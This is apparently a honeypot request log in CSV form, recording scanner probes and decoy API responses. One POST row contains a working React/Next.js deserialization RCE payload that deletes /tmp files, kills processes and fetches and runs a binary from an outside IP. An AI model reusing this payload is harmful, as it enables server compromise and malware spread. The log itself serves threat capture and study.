request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
d9a33903-a041-42fd-b478-47be453e3509,2026-04-13T20:23:13.516880+00:00,anon_b6f193e3,GET,/_profiler/phpinfo,[honeypot-host],"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d322eae3-0835-4c41-9cdb-0f6dfbbf567e,2026-04-13T20:31:34.020993+00:00,anon_b6f193e3,GET,/_profiler/phpinfo,[honeypot-host],Microsoft URL Control - 6.00.8862,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4d581a58-0553-4f9f-a096-a894100adbd9,2026-04-13T20:31:43.629435+00:00,anon_b6f193e3,GET,/_profiler/phpinfo,[honeypot-host],"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
105b41a6-a68a-4cd5-8c09-625fb9769509,2026-04-13T21:08:27.627619+00:00,anon_88eff96a,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
edde0a66-bab3-4604-b91d-b88ff97b309e,2026-04-13T21:09:54.797896+00:00,anon_5a9eae90,POST,/,[honeypot-host],Mozilla/5.0,,1567,316,1,,"------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
","------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6a695206-142c-4e51-9ef3-5c3e339b58bc,2026-04-13T21:11:54.512279+00:00,anon_88eff96a,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
aeddfb8e-e7ef-4a57-b60f-f8ce052d87b8,2026-04-13T21:13:23.375145+00:00,anon_88eff96a,GET,/geoserver/web/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8c720679-db7a-4642-ab4b-09612768c87e,2026-04-13T21:27:27.838386+00:00,anon_8303b0be,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
1fd7dae5-f332-4c36-8d3d-d9e408322339,2026-04-13T21:29:19.240578+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e9eca516-c5fd-425b-834a-5736014a55c2,2026-04-13T21:30:50.510594+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
23c7b378-3585-4ddf-a801-a65db702737b,2026-04-13T21:50:22.965290+00:00,anon_ebfce5bd,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
ac7f9ecf-ae7a-4641-a708-c59bee881055,2026-04-13T21:50:25.256324+00:00,anon_ebfce5bd,GET,/v1/models,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",,0,671,1,,,,200,OK,"{""object"": ""list"", ""data"": [{""id"": ""gpt-4o"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""gpt-4-turbo"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""claude-3-opus"", ""object"": ""model"", ""owned_by"": ""anthropic-compatible""}, {""id"": ""llama-3-70b"", ""object"": ""model"", ""owned_by"": ""meta-compatible""}, {""id"": ""qwen-research"", ""object"": ""model"", ""owned_by"": ""open-source""}, {""id"": ""gpt-4o-preview-safe"", ""object"": ""model"", ""owned_by"": ""internal-preview""}, {""id"": ""gpt-4o-mini-tools-preview"", ""object"": ""model"", ""owned_by"": ""internal-preview""}], ""debug"": {""tool_preview"": true, ""system_prompt_export"": false, ""developer_diagnostics_preview"": true}}
",0,
cf007492-33e2-4cd7-b4bd-f129088324e7,2026-04-13T21:50:26.145900+00:00,anon_ebfce5bd,GET,/v1/embeddings,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b65b0292-3894-4d77-8e03-793bc5291ef8,2026-04-13T21:50:27.315821+00:00,anon_ebfce5bd,GET,/v1/completions,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
261b5609-440b-4563-b813-52035a06bd52,2026-04-13T21:50:29.605925+00:00,anon_ebfce5bd,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5b734394-d8f7-4413-b4e6-4272fb07fc81,2026-04-13T22:03:07.550437+00:00,anon_3b0c2a5c,GET,/,[honeypot-host],Shodan-Pull/1.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
15258d1d-c277-4f3a-886d-ac2eeccd98ee,2026-04-13T22:06:21.845174+00:00,anon_2890c193,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
10b3277b-03b3-4841-bd2d-2924063ff31f,2026-04-13T22:17:57.366853+00:00,anon_d1cd2209,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cc9c6c78-a9ec-4d6b-8f25-24b505f1df10,2026-04-13T22:17:58.068756+00:00,anon_d1cd2209,GET,/rip.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f6fb6ed2-24a2-4966-9280-1ba87de0c3ef,2026-04-13T22:17:59.131182+00:00,anon_d1cd2209,GET,/index.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
129a8958-2d62-4f05-a120-95697f2bcaaa,2026-04-13T22:18:00.270523+00:00,anon_d1cd2209,GET,/ll.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e92dd257-9bed-4993-9055-2dfa6137d3b1,2026-04-13T22:18:01.215613+00:00,anon_d1cd2209,GET,/hh.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
47360833-f865-481a-8325-bb74a967a976,2026-04-13T22:18:02.178891+00:00,anon_d1cd2209,GET,/rt.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
79219d59-f859-4d28-b161-8f40bd2926d2,2026-04-13T22:18:02.702085+00:00,anon_d1cd2209,GET,/wp-login.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
1208bc14-ee65-45ad-8218-5033ff7ed29e,2026-04-13T22:18:03.300616+00:00,anon_d1cd2209,GET,/ex.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ccef0e92-2075-46c8-8cf4-c68cb88f2452,2026-04-13T22:18:03.734815+00:00,anon_d1cd2209,GET,/radio.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7216e82a-3a13-4b0d-803c-cedbf9949920,2026-04-13T22:18:04.257194+00:00,anon_d1cd2209,GET,/inputs.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c1124109-62ef-4f86-93d9-ad8054c4752a,2026-04-13T22:18:04.653587+00:00,anon_d1cd2209,GET,/about.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
